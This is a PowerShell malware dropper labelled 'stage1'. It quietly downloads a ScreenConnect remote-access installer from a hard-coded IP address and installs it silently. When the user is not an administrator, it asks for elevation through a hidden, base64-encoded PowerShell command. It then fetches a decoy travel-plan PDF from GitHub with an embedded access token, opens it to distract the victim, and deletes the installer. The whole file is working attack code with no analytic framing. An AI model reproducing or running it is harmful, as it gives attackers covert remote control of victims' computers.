# stage1.ps1 - MSI install first, then PDF decoy
$ErrorActionPreference = 'SilentlyContinue'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$githubToken = "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"
$githubHeaders = @{
    "Authorization" = "token $githubToken"
    "Accept" = "application/vnd.github.v3+json"
}

# === 1. Download ScreenConnect MSI ===
$msiUrl = "http://96.30.206.19:8040/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
$msiPath = Join-Path $env:TEMP "ScreenConnect.ClientSetup.msi"

try {
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
    $wc.DownloadFile($msiUrl, $msiPath)
} catch {}

# === 2. Install ScreenConnect (UAC if needed) ===
if (Test-Path $msiPath) {
    $sz = (Get-Item $msiPath).Length
    if ($sz -gt 1000000) {
        $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
        if ($isAdmin) {
            Start-Process "msiexec.exe" -ArgumentList "/i `"$msiPath`" /qn /norestart" -WindowStyle Hidden -Wait
        } else {
            $installCmd = "Start-Process 'msiexec.exe' -ArgumentList '/i `"$msiPath`" /qn /norestart' -WindowStyle Hidden -Wait"
            $encodedCmd = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($installCmd))
            Start-Process "powershell.exe" -ArgumentList "-NoP -W Hidden -EP Bypass -EncodedCommand $encodedCmd" -Verb RunAs
        }
    }
}

# === 3. Download PDF Decoy ===
$pdfPath = Join-Path $env:TEMP "Travel_Plan_Meeting_Q4_2026.pdf"
try {
    $fileInfo = Invoke-RestMethod -Uri "https://api.github.com/repos/slynet999-coder/Yambo/contents/Travel_Plan_Meeting_Q4_2026.pdf" -Headers $githubHeaders
    $wc2 = New-Object System.Net.WebClient
    $wc2.Headers.Add("User-Agent", "Mozilla/5.0")
    $wc2.DownloadFile($fileInfo.download_url, $pdfPath)
} catch {}

# === 4. Open PDF in Edge ===
if (Test-Path $pdfPath) {
    $edge = "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"
    if (Test-Path $edge) {
        Start-Process $edge -ArgumentList "`"$pdfPath`""
    }
}

# === 5. Cleanup ===
Start-Sleep 5
try { Remove-Item $msiPath -Force -ErrorAction SilentlyContinue } catch {}
